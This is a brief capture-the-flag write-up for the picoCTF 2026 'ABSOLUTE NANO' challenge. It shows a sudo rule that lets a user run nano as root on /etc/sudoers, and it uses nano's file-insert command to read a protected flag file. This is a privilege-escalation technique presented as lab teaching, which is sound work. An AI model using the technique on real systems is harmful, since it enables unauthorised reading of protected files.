# ABSOLUTE NANO
Challenge Description:
> You have complete power with nano. Think you can get the flag?

CTF: <b>picoCTF 2026</b>
<br>Points: <b>200</b>
<br>Difficulty: <b>Easy</b>

<b>[Jump to solution](#solution)</b>

## Hints
Here are the hints provided by the challenge author.
<details>
<summary>Hint 1</summary>

> What can you do with nano?
</details>

## Procedure
Running `sudo -l` shows we can run `nano` as root, but only for a specific file.
```
~$ sudo -l
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/nano /etc/sudoers
```

nano lets you open whatever file you want with `Ctrl+R`, so we can just open the `flag.txt` after running `sudo /bin/nano /etc/sudoers`.

## Solution
1. Run `sudo /bin/nano /etc/sudoers`
2. Press `Ctrl+R` and enter `flag.txt`
